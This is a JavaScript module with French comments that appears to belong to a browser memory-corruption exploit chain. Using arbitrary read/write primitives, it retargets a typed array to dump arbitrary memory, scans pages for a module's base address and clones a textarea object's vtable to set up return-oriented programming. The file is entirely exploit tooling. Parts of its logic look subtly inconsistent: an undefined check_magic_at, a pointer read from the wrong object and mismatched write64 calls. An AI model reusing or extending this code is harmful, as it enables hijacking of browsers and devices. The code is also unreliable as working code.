import { Int } from './int64.mjs';
import { align } from './utils.mjs';
import { page_size } from './offset.mjs';
import * as rw from './rw.mjs';

// Crée un buffer à partir d'une adresse mémoire
export function make_buffer(addr, size) {
    const u = new Uint8Array(1001);
    const u_addr = rw.read64(addr);

    const old_addr = u_addr.read64();
    const old_size = u_addr.read32();

    u_addr.write64(addr);
    u_addr.write32(size);

    const copy = new Uint8Array(u.length);
    copy.set(u);

    // Restaure les anciens paramètres
    u_addr.write64(old_addr);
    u_addr.write32(old_size);

    return copy.buffer;
}

// Recherche la base d’un module mémoire
export function find_base(addr, is_text, is_back) {
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size;

    while (true) {
        if (check_magic_at(addr, is_text)) {
            break;
        }
        addr = addr.add(offset);
    }
    return addr;
}

// Crée un clone de l'objet textarea pour ROP
export function create_ta_clone(obj) {
    const js_size = 0x10;
    const vtable_size = 0x1000;
    const webcore_ta_size = 0x180;

    const ta_clone = {};
    obj.ta_clone = ta_clone;
    const clone_p = rw.read64(ta_clone);
    const ta_p = rw.read64(document.createElement('textarea'));

    for (let i = js_size; i < 0x20; i += 8) {
        clone_p.write64(i, ta_p.read64(i));
    }

    obj.vtable_clone = new Uint8Array(make_buffer(ta_p, vtable_size));
    clone_p.write64(0, ta_p.read64(0));

    return clone_p;
}
